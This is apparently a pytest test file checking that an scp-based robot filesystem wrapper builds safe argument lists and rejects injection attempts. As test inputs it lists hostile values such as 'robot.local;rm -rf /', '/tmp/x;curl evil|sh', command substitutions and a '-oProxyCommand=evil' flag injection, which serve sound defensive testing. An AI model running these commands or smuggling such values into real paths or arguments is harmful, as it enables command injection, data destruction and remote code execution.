"""LB-03: robot filesystem over SSH/scp — pinned arg lists, defensive paths."""

from pathlib import Path

import pytest
from livebench.deploy.fs import SshFilesystem


class CapturingExec:
    def __init__(self, returncode: int = 0) -> None:
        self.calls: list[list[str]] = []
        self.returncode = returncode

    async def __call__(self, argv: list[str]) -> tuple[int, str]:
        self.calls.append(argv)
        return self.returncode, "" if self.returncode == 0 else "scp: failure"


def fs(execute: CapturingExec) -> SshFilesystem:
    return SshFilesystem(
        host="robot.local", user="pi", scp_binary="/usr/bin/scp", execute=execute
    )


async def test_push_builds_a_batchmode_scp_arg_list(tmp_path: Path) -> None:
    execute = CapturingExec()
    local = tmp_path / "config.yaml"
    local.write_text("a: 1")

    await fs(execute).push(local, "/home/pi/config.yaml")

    (argv,) = execute.calls
    assert argv[0] == "/usr/bin/scp"
    assert "BatchMode=yes" in " ".join(argv)
    assert "--" in argv  # option/operand separator: a hostile filename cannot become a flag
    assert argv[-1] == "pi@robot.local:/home/pi/config.yaml"


async def test_pull_targets_the_local_path(tmp_path: Path) -> None:
    execute = CapturingExec()

    await fs(execute).pull("/var/log/robot.log", tmp_path / "robot.log")

    (argv,) = execute.calls
    assert argv[-2] == "pi@robot.local:/var/log/robot.log"
    assert argv[-1] == str(tmp_path / "robot.log")


async def test_remote_paths_may_not_look_like_flags(tmp_path: Path) -> None:
    execute = CapturingExec()

    with pytest.raises(ValueError, match="flag"):
        await fs(execute).pull("-oProxyCommand=evil", tmp_path / "x")
    assert execute.calls == []


async def test_scp_failure_surfaces_with_context(tmp_path: Path) -> None:
    execute = CapturingExec(returncode=1)
    local = tmp_path / "f"
    local.write_text("x")

    with pytest.raises(RuntimeError, match="scp"):
        await fs(execute).push(local, "/tmp/f")


def test_hostnames_and_users_are_validated() -> None:
    with pytest.raises(ValueError):
        SshFilesystem(host="robot.local;rm -rf /", user="pi", scp_binary="/usr/bin/scp")
    with pytest.raises(ValueError):
        SshFilesystem(host="robot.local", user="pi user", scp_binary="/usr/bin/scp")


@pytest.mark.parametrize(
    "evil",
    [
        "/tmp/x;curl evil|sh",
        "/tmp/$(whoami)",
        "/tmp/`id`",
        "/tmp/a&b",
        "/tmp/a|b",
        "/tmp/*",
        "~/secret",
        "/tmp/a b",
        "-oProxyCommand=evil",
    ],
)
async def test_shell_unsafe_remote_paths_are_rejected(tmp_path: Path, evil: str) -> None:
    # Security (both directions): a legacy-protocol scp hands the remote path to the
    # robot's shell; nothing shell-expandable may reach it.
    execute = CapturingExec()
    local = tmp_path / "f"
    local.write_text("x")

    with pytest.raises(ValueError, match="shell-unsafe|flag"):
        await fs(execute).push(local, evil)
    with pytest.raises(ValueError, match="shell-unsafe|flag"):
        await fs(execute).pull(evil, tmp_path / "out")
    assert execute.calls == []
